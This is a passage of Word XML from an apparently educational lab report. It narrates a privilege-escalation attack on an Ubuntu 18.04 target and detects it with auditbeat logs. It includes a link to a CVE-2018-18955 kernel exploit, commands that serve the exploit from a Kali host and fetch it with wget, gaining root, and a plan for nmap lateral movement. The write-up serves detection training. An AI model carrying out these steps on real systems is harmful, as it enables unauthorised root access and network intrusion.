          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">From the picture above we got log comes from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auditbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and we understand from this log there is malicious activity because we see first the script cleanup.sh running and then we see log with process </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>args</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> bash –I which is the time when </w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>the reverse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> shell of the attacker opened after the attacking we definitely can monitor this types of attacks. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B76C7B" w:rsidRPr="00944C35" w:rsidRDefault="00333243" w:rsidP="00333243">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRPr="00D728B1" w:rsidRDefault="00333243" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60E45078" wp14:editId="31F00188">
            <wp:extent cx="5486400" cy="1203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203960"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00333243" w:rsidRPr="00333243" w:rsidRDefault="00333243" w:rsidP="00333243">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we are the user art and we want privilege escalation to root so first we run the command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –a which show the number of the kernel and the date when installed the second command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lsb_relase</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –a which show the version of the operating system which in this case 18.04 now as the attacker we need check on google maybe we got exploit for privilege escalation for this system kernel number 4.15 and Ubuntu 18.04 let’s check on google if we can find some exploit.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00333243" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="12749F2F" wp14:editId="1F0B8440">
            <wp:extent cx="5486400" cy="25444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544445"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00333243" w:rsidRPr="00333243" w:rsidRDefault="00333243" w:rsidP="00333243">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Link to exploit: </w:t>
      </w:r>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>https://github.com/SecWiki/linux-kernel-explo</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>/tree/master/2018/CVE-2018-18955</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00333243" w:rsidRPr="00333243" w:rsidRDefault="00333243" w:rsidP="00333243">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Now the picture above we search on google explo</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> for our target which is Ubuntu 18.04 and kernel number 4.15 after we try few explo</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and they failed I find this exploit with the name CVE-2018-18955 this </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cve</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> for local privilege escalation on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> systems let’s try run this exploit and see if we got root. First we need download this exploit to our attacker(Kali) machine and then again move this exploit to our target machine and run from target machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00333243" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3E44C8E4" wp14:editId="6FDBA326">
            <wp:extent cx="5486400" cy="2180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180590"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00333243" w:rsidRPr="00333243" w:rsidRDefault="00333243" w:rsidP="00333243">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>So on the picture above we are now on our kali machine and we downloaded all the files of the exploit, and now we need transfer all this files to our Ubuntu target to try run those explo</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and maybe we will have got the root shell. First because this exploit contains a lot of files like we see in the picture first I zip all this files to zip file with the command: zip –r file.zip /cve18</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00333243" w:rsidRDefault="00333243" w:rsidP="00333243">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">After we zip all this files we got the file: file.zip like in the picture this contains our exploit for root shell and now we will use again python server on kali machine and we will use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00333243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> on our target machine to download our exploit let’s do that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00333243" w:rsidRPr="00333243" w:rsidRDefault="00333243" w:rsidP="00333243">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3A8568B8" wp14:editId="2B0F2BFE">
            <wp:extent cx="461010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100" cy="1533525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C62EB0" w:rsidRPr="00C62EB0" w:rsidRDefault="00C62EB0" w:rsidP="00C62EB0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Here above we are on our kali machine and we got our exploit ‘file.zip’ which we need to transfer to our target next step I open python server on port 80 with the command python –m </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>SimleHTTPServer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 80 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C62EB0" w:rsidRDefault="00C62EB0" w:rsidP="00C62EB0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>And in that way we can download our exploit from the attacker machine to our Ubuntu target.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C62EB0" w:rsidRPr="00C62EB0" w:rsidRDefault="00C62EB0" w:rsidP="00C62EB0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F5659BB" wp14:editId="3EBD2F61">
            <wp:extent cx="5486400" cy="246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463800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C62EB0" w:rsidRPr="00C62EB0" w:rsidRDefault="00C62EB0" w:rsidP="00C62EB0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need download the exploit for the root so we used the command : </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId57" w:history="1">
        <w:r w:rsidRPr="00C62EB0">
          <w:rPr>
            <w:color w:val="0563C1" w:themeColor="hyperlink"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://10.0.0.14/file.zip</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00C62EB0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:rtl/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>And we downloaded our zip file now we need unzip and try run the explo</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and hope this will give us root shell</w:t>
      </w:r>
      <w:r w:rsidR="00921388">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="00C62EB0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>let’s try that</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026720B" w:rsidRDefault="0026720B" w:rsidP="00C62EB0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="25591B57" wp14:editId="667AA6E7">
            <wp:extent cx="5486400" cy="61696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6169660"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026720B" w:rsidRPr="0026720B" w:rsidRDefault="0026720B" w:rsidP="0026720B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">The picture above we first unzip our exploit with the command: unzip file.zip then we go inside the directory that make from our zip file and then ‘ls –la’ and now we have all our files of our </w:t>
      </w:r>
      <w:r w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>exploit let try run one of them and see if we got root shell and get full access on this machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="0026720B" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1784F142" wp14:editId="62282533">
            <wp:extent cx="5486400" cy="47263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4726305"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026720B" w:rsidRPr="0026720B" w:rsidRDefault="00E7245A" w:rsidP="0026720B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>It</w:t>
      </w:r>
      <w:r w:rsidR="0026720B" w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Works! From the picture above we first try one exploit and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidR="0026720B" w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> failed then we try another one</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026720B" w:rsidRDefault="0026720B" w:rsidP="0026720B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">And </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> works perfect now we got root shell and we have full access to this machine we can run any type of commands we fully privilege escalation. so from here we now need check how we can</w:t>
      </w:r>
      <w:r w:rsidRPr="0026720B">
        <w:rPr>
          <w:rFonts w:hint="cs"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:rtl/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">spread out throw all the network and try find another alive hosts on this subnet or maybe even there is few subnets from </w:t>
      </w:r>
      <w:r w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">here we will run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0026720B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> from our root shell on the target machine and try find another alive hosts or servers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008162AB" w:rsidRDefault="008162AB" w:rsidP="0026720B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002602ED" w:rsidRDefault="002602ED" w:rsidP="002602ED">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="0020780D">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidR="008162AB" w:rsidRPr="00333243">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Privilege </w:t>
      </w:r>
      <w:r w:rsidR="008162AB">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidR="008162AB" w:rsidRPr="00333243">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>scalation</w:t>
      </w:r>
      <w:r w:rsidR="008162AB">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Detection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002602ED" w:rsidRPr="002602ED" w:rsidRDefault="002602ED" w:rsidP="002602ED">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00921388" w:rsidRDefault="002602ED" w:rsidP="002602ED">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="73D12000" wp14:editId="38C59BC8">
            <wp:extent cx="5486400" cy="265780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657802"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="002602ED" w:rsidRDefault="002602ED" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> another </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auditbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> log which comes from our Ubuntu</w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">(target machine) this time we see in red when the attacker </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>try</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to privilege escalation we can see process started with the file name exploit.cron.sh which our exploit for root shell.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002602ED" w:rsidRDefault="002602ED" w:rsidP="002602ED">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48CF264C" wp14:editId="4DFCFAD0">
            <wp:extent cx="5486400" cy="2878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878455"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
